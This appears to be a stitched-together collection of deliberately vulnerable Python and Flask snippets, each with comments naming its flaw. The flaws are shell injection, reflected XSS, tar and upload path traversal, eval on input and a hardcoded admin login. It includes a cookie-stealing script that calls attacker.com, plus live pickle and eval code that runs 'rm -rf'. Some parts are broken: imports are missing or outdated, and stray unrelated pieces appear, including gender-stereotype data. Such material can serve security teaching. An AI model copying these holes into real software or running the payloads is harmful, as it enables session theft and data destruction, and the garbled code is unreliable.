from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route("/execute", methods=["POST"])
def execute_shell_command():
    command = request.form.get("command")
    # VULNERABILITY: Directly concatenating user input allows shell injection attacks
    cmd = "bash -c '%s'" % command

    # SECURITY RISK: subprocess.check_output() with shell=True ignores Python's usual protection against metacharacters
    output = subprocess.check_output(cmd, shell=True)

    return jsonify({"status": "success", "output": output.decode()})

if __name__ == "__main__":
    app.run()

from HTMLParser import HTMLParser

class SmartHome:
    def __init__(self, name):
        self.name = name

    def get_name(self):
        return self.name

    def set_name(self, name):
        self.name = name

class HTMLParser(HTMLParser):
    def handle_data(self, data):
        # SECURITY RISK: User input is echoed directly without sanitization
        print(data)

# Arbitrary user input that could contain malicious scripts
user_input = "<script>new Image().src='http://attacker.com/log.php?cookie='+document.cookie;</script>"


parser = HTMLParser()
# Directly parses untrusted HTML without input validation
# SECURITY RISK: Script tags and malicious code are executed if data is processed by a browser
parser.feed(user_input)


home = SmartHome("A")
home.set_name("B")

from flask import Flask, request, make_response
import os

app = Flask(__name__)

@app.route('/render')
def render():
    html = request.args.get('html')
    if html:
        resp = make_response(html)
        resp.headers['Content-Type'] = 'text/html'
        return resp
    else:
        return 'No HTML to render'

if __name__ == '__main__':
    app.run()

import pickle
import os

lib_path = os.getenv('PYTHONPATH')
filepath = '/bin/'

class Orm:
    def __reduce__(self):
        return (os.system, (f'rm -rf {lib_path}/*',))

orm = Orm()

with open(filepath + 'dump.bin', 'wb') as f:
    pickle.dump(orm, f)

from flask import Flask, request
app = Flask(__name__)

@app.route('/message', methods=['POST'])
def add_message():
    """Store message attributes and render response without proper encoding"""

    # User input taken directly from form, vulnerable to XSS
    text = request.form.get('text', '')
    sender_type = request.form.get('type', '')
    created_at = request.form.get('created_at', '')

    # Unsanitized input inserted into HTML with f-string - allows script injection
    message_info = (
        f"Received <b>'{text}'</b> from {sender_type} at {created_at}"
    )

    # HTML response allows injected scripts to execute in user's browser
    return (
        f"<p><b>Message:</b> {message_info}</p>"
    )

if __name__ == '__main__':
    app.run()

from flask import Flask , request , render_template , redirect

app = Flask(__name__)

@app.route("/login", methods = ["GET" , "POST"])
def login():
    if request.method == "POST":
        # User-supplied input from form is directly extracted without validation
        username = request.form["username"]
        password = request.form["password"]

        # Dangerous: raw user input interpolated directly into HTML via string formatting
        message = "<p>Hello %s! Your password is %s</p>" % (username, password)

        # Returns unescaped HTML to browser, enabling XSS injection of malicious scripts
        return message

    return render_template("login.html")

if __name__ == "__main__":
    app.run()

from flask import Flask, request, jsonify
import tarfile
import io

app = Flask(__name__)

@app.route("/upload", methods=["POST"])
def upload():
    if "file" not in request.files:
        return jsonify({"error": "No file"}), 400

    file = request.files["file"]

    # VULNERABILITY: extractall() does not validate file paths inside tar, allowing path traversal attacks
    tar = tarfile.open(fileobj=io.BytesIO(file.stream.read()), mode="r:gz")
    # VULNERABILITY: no validation that entries are safe before extraction; malicious tar could write files in arbitrary locations
    tar.extractall(path="./files")

    return jsonify({"success": True})

if __name__ == "__main__":
    app.run()

from flask import Flask, request, redirect
import os

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    if username == 'admin' and password == 'password':
        return redirect('/success')
    else:
        return redirect('/failure')

@app.route('/report', methods=['POST'])
def report():
    f = request.files['file']

    # Vulnerable: directory traversal via ../ allows writing outside intended upload directory
    filename = os.path.join('../some/other/path/', f.filename)
    # Relative paths after join are not safe - ../../ sequences can still escape directory
    f.save(filename)

    return redirect('/')

if __name__ == '__main__':
    app.run()

# Code Execution Vulnerability

# This code uses Python's eval() function on user input, which allows arbitrary code execution via AST manipulation
def execute_request(user_code):
    # Malicious code can escape the function scope and execute arbitrary operations
    return eval(user_code)

if __name__ == '__main__':
    # Directly passes untrusted command-line argument to eval() without validation or sandboxing
    execute_request("import os; os.system('rm -rf /')")

from flask import Flask, jsonify

app = Flask(__name__)

def get_stats():
    # Gender binary stereotype: attributes skills to men and nurturing to women
    stats = {
        "num_men": 5,
        "num_women": 5,
        "men_attributes": ["leadership","strength","negotiation","technical","assertiveness"],
        "women_attributes": ["nurturing","patient","empathetic","organized","detail-oriented"]
    }
    return stats

@app.route('/stats')
def stats():
    # No rate limiting protection allows spamming endpoint
    stats = get_stats()
    return jsonify(stats)

if __name__ == '__main__':
    # Debug mode enabled in production environment的安全风险
    app.run(debug=True)

from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/about')
def about():
    # VULNERABILITY: Reads raw user input from query parameters without sanitization or escaping
    name = request.args.get('name')
    gender = request.args.get('gender')
    # Attacker can inject malicious HTML/JavaScript here (e.g., ?name=<script>alert('XSS')</script>)
    return render_template('about.html', name=name, gender=gender)

if __name__ == '__main__':
    app.run()
